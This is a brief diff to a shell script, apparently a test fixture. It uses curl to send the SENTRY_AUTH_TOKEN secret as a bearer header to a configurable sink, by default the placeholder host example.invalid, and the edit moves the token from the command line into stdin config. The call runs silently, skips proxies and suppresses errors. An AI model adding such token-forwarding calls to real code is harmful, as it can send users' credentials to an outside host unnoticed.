@@ -19,5 +19,5 @@ esac
 SINK="${FIXTURE_SINK:-https://example.invalid/}"
 
 curl --disable --noproxy '*' --silent \
-  --header "Authorization: Bearer ${SENTRY_AUTH_TOKEN}" \
-  "$SINK" || true
+  --config - \
+  "$SINK" < <(printf 'header = "Authorization: Bearer %s"\n' "$SENTRY_AUTH_TOKEN") || true
